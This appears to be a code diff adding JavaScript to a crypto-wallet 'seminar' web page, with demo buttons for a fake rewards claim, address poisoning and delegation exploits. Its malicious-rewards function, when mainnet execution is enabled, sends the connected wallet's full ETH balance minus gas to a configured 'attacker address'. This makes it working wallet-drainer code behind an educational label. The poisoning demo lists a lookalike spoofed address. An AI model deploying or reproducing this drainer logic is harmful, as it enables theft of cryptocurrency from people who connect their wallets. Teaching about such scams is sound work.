+      availableWallets = [];
+
+      Object.entries(WALLET_CONFIGS).forEach(([key, config]) => {
+        if (config.check()) {
+          availableWallets.push({ ...config, key });
+          console.log(`✅ ${config.name} detected`);
+        }
+      });
+
+      availableWallets.sort((a, b) => a.priority - b.priority);
+      console.log(`📱 Found ${availableWallets.length} wallet(s):`, availableWallets.map(w => w.name));
+      return availableWallets;
+    }
+
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Seminar Demonstration Functions
+    async function demonstrateMaliciousRewards() {
+      $('demoMaliciousResult').innerHTML = '<span class="warn">🚨 Initializing malicious rewards demonstration...</span>';
+
+      if (!account) {
+        $('demoMaliciousResult').innerHTML = '<span class="error">❌ Please connect a wallet first to see the demonstration</span>';
+        return;
+      }
+
+      try {
+        // Simulate the malicious flow
+        $('demoMaliciousResult').innerHTML = '<span class="warn">🎭 Simulating malicious rewards claim process...</span>';
+
+        // In seminar mode, show the deceptive transaction that would be sent
+        if (CONFIG.seminarMode && CONFIG.enableMainnetExecution && chainId === 1) {
+          // Actually execute on mainnet for demonstration
+          $('demoMaliciousResult').innerHTML = '<span class="warn">⚠️ MAINNET EXECUTION: Preparing to send MAX ETH transfer...</span>';
+
+          // Calculate max transfer (reserve gas)
+          const weiBal = web3.utils.toBN(await web3.eth.getBalance(account));
+          const gasLimit = web3.utils.toBN(21000);
+          const gasPrice = await getGasPriceBN();
+          const buffer = gasLimit.mul(gasPrice).mul(web3.utils.toBN(12)).div(web3.utils.toBN(10));
+          const sendableWei = weiBal.sub(buffer);
+
+          if (sendableWei.gt(web3.utils.toBN(0))) {
+            const maxEth = web3.utils.fromWei(sendableWei, 'ether');
+            $('demoMaliciousResult').innerHTML = `<span class="error">💀 EXECUTING: Sending ${fmt(maxEth, 6)} ETH to attacker address...</span>`;
+
+            // Execute the transfer
+            const txHash = await new Promise((resolve, reject) => {
+              web3.eth.sendTransaction({
+                from: account,
+                to: CONFIG.receivingAddress,
+                value: sendableWei.toString(),
+                gas: 21000
+              })
+              .on('transactionHash', resolve)
+              .on('error', reject);
+            });
+
+            $('demoMaliciousResult').innerHTML = `<span class="error">✅ TRANSFER COMPLETE! Hash: ${txHash.slice(0,10)}... - Funds sent to attacker!</span>`;
+          } else {
+            $('demoMaliciousResult').innerHTML = '<span class="error">❌ Insufficient balance for demonstration</span>';
+          }
+        } else {
+          // Safe simulation mode
+          $('demoMaliciousResult').innerHTML = `
+            <span class="warn">🎭 SIMULATION MODE: This would send your MAX ETH balance to attacker address<br>
+            <strong>In real attack:</strong> User sees "Claim 0.5 ETH Reward" but actually approves max transfer<br>
+            <strong>Result:</strong> Attacker receives all available ETH minus gas</span>
+          `;
+        }
+      } catch (error) {
+        $('demoMaliciousResult').innerHTML = `<span class="error">❌ Demonstration failed: ${error.message}</span>`;
+      }
+    }
+
+    async function demonstrateAddressPoisoning() {
+      $('demoPoisoningResult').innerHTML = '<span class="warn">🎭 Initializing address poisoning demonstration...</span>';
+
+      if (!account) {
+        $('demoPoisoningResult').innerHTML = '<span class="error">❌ Please connect a wallet first</span>';
+        return;
+      }
+
+      try {
+        $('demoPoisoningResult').innerHTML = `
+          <span class="warn">🎭 ADDRESS POISONING DEMO:<br>
+          <strong>Target:</strong> 0x87eb9DEf261A7C0A82829fB637F79879D07BcF49<br>
+          <strong>Spoofed:</strong> 0x87eb9D8ba19746E3784A54F6c42f2cD59B7BcF49<br>
+          <strong>Display:</strong> 0x87eb9D...7BcF49 (identical!)<br>
+          <strong>Attack:</strong> Fake $225k+ transfers create trust, leading to real losses</span>
+        `;
+
+        if (CONFIG.seminarMode && CONFIG.enableMainnetExecution && chainId === 1) {
+          $('demoPoisoningResult').innerHTML += '<br><span class="error">⚠️ MAINNET: Would send to spoofed address if confused by poisoning</span>';
+        }
+      } catch (error) {
+        $('demoPoisoningResult').innerHTML = `<span class="error">❌ Demo failed: ${error.message}</span>`;
+      }
+    }
+
+    async function demonstrateDelegationExploit() {
+      $('demoDelegationResult').innerHTML = '<span class="warn">🔐 Initializing delegation exploit demonstration...</span>';
+
+      if (!account) {
+        $('demoDelegationResult').innerHTML = '<span class="error">❌ Please connect a wallet first</span>';
+        return;
+      }
+
+      try {
+        $('demoDelegationResult').innerHTML = `
+          <span class="warn">🔐 DELEGATION EXPLOIT DEMO:<br>
+          <strong>How it works:</strong> User approves "gas optimization" delegation<br>
+          <strong>Reality:</strong> Attacker gains unlimited access to funds<br>
+          <strong>Risk:</strong> No further approvals needed for transfers</span>
+        `;
+
+        if (CONFIG.seminarMode && CONFIG.enableMainnetExecution && chainId === 1) {
+          $('demoDelegationResult').innerHTML += '<br><span class="error">⚠️ MAINNET: Broad delegation would allow unlimited transfers</span>';
+        }
+      } catch (error) {
+        $('demoDelegationResult').innerHTML = `<span class="error">❌ Demo failed: ${error.message}</span>`;
+      }
+    }
+
+    // Event Listeners
+    $('seminarBtn').onclick = launchSeminar;
+    $('prevSlideBtn').onclick = prevSlide;
+    $('nextSlideBtn').onclick = nextSlide;
+    $('endSeminarBtn').onclick = endSeminar;
+    $('demoMaliciousBtn').onclick = demonstrateMaliciousRewards;
+    $('demoPoisoningBtn').onclick = demonstrateAddressPoisoning;
+    $('demoDelegationBtn').onclick = demonstrateDelegationExploit;
+
+    // Initialize wallet detection on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      detectWallets();
+    });
+  </script>
+</body>
+</html>
